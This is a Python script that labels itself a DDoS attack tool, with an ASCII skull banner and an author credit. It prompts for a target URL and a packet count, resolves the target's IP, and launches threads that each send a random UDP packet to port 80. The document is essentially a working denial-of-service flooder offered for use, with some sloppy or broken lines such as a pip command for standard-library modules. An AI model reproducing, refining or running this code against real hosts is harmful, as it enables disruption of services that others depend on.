try: import socket, random, threading, os
except ModuleNotFoundError:
    os.system("pip install socket random threading os")

    os.system("clear")

Black = "\033[1;30m"
Red = "\033[1;31m"
Green = "\033[1;32m"
Yellow = "\033[1;33m"
Blue = "\033[1;34m"
Purple = "\033[1;35m"
Cyan = "\033[1;36m"
White = "\033[1;37m"
Gray = "\033[1;39m"
DarkRed = "\033[2;31m"
DarkBlue = "\033[2;34m"
DarkPink = "\033[2;35m"
DarkCyan = "\033[2;36m"

print("""\033[1;31m
                    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                 ¶¶¶¶¶¶             ¶¶¶¶¶¶¶
              ¶¶¶¶                       ¶¶¶¶
             ¶¶¶                             ¶¶
            ¶¶                                ¶¶
           ¶¶                                 ¶¶
          ¶¶                                   ¶¶
          ¶¶ ¶¶                             ¶¶ ¶¶
          ¶¶ ¶¶                             ¶¶  ¶
          ¶¶ ¶¶                             ¶¶  ¶
          ¶¶  ¶¶                            ¶¶ ¶¶
          ¶¶  ¶¶                           ¶¶  ¶¶
           ¶¶ ¶¶   ¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶   ¶¶ ¶¶
            ¶¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶
             ¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶
    ¶¶¶      ¶¶  ¶¶¶¶¶¶¶¶        ¶¶¶¶¶¶¶¶¶  ¶¶      ¶¶¶¶
   ¶¶¶¶¶     ¶¶  ¶¶¶¶¶¶¶    ¶¶¶   ¶¶¶¶¶¶¶   ¶¶     ¶¶¶¶¶¶
  ¶¶   ¶¶   ¶¶     ¶¶¶     ¶¶¶¶¶    ¶¶¶     ¶¶    ¶¶   ¶¶
 ¶¶¶    ¶¶¶¶  ¶¶          ¶¶¶¶¶¶¶          ¶¶ ¶¶¶¶    ¶¶¶
 ¶¶         ¶¶¶¶¶¶¶¶      ¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶        ¶¶
¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶¶      ¶¶¶¶¶¶¶¶
  ¶¶¶¶ ¶¶¶¶¶      ¶¶¶¶¶              ¶¶¶ ¶¶     ¶¶¶¶¶¶ ¶¶¶
          ¶¶¶¶¶¶ ¶¶¶  ¶¶           ¶¶ ¶¶¶ ¶¶¶¶¶¶
              ¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶
                  ¶¶ ¶¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶¶
                ¶¶¶¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶   ¶¶¶¶¶
            ¶¶¶¶¶ ¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶ ¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶     ¶¶                 ¶¶      ¶¶¶¶¶¶¶¶¶
   ¶¶           ¶¶¶¶¶¶¶             ¶¶¶¶¶¶¶¶          ¶¶
    ¶¶¶     ¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶     ¶¶¶
      ¶¶   ¶¶¶           ¶¶¶¶¶¶¶¶¶           ¶¶¶   ¶¶
      ¶¶  ¶¶                                   ¶¶  ¶¶
       ¶¶¶¶                                     ¶¶¶¶

                          \033[1;37mv0.0.0
                        DDOS Attack

THIS TOOL WAS PROGRAMMED BY TLER AL-SHAHRANI.
PERSONAL WEBSITE : \033[1;34mhttps://tlersa.github.io/tleralshahrani/Index.html""")
print("\033[1;37m- "*35)

def create_rnd_msg(msg_size):
	  rnd_msg = ""
	  for i in range(0, msg_size):
		    ch_rnd = random.randint(0, 255)
		    rnd_msg += chr(ch_rnd)
	  return rnd_msg

site = input("[\033[1;31m+\033[1;37m] Enter the target URL : \033[1;31m")
if 'https://'in site: site=site.split('https://')[1]
if '/'in site : site=site.split('/')[0]

thread_count = int(input("\033[1;37m[\033[1;31m+\033[1;37m] Enter the num of requests on the target server : \033[1;31m"))
ip = socket.gethostbyname(site)

UDP_PORT = 80

print(f"""
\033[1;37m[\033[1;32m-\033[1;37m] Target URL : \033[1;31m{site}
\033[1;37m[\033[1;32m-\033[1;37m] Target IP : \033[1;31m{ip}
\033[1;37m[\033[1;32m-\033[1;37m] Protocol : \033[1;31mUDP
\033[1;37m[\033[1;32m-\033[1;37m] Target port : \033[1;31m{UDP_PORT}""")

i = 0

def ddos():
		MESSAGE = str.encode(create_rnd_msg(8))
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(MESSAGE, (ip, UDP_PORT))
		print(f"\n\r\033[1;37m[\033[1;32m✓\033[1;37m] Sent successfuly \033[1;32m{i}\033[1;37m!", end='')	

thread_count = thread_count+1

for i in range(thread_count):
	  try: threading.Thread(target=ddos).start()	
	  except KeyboardInterrupt: exit()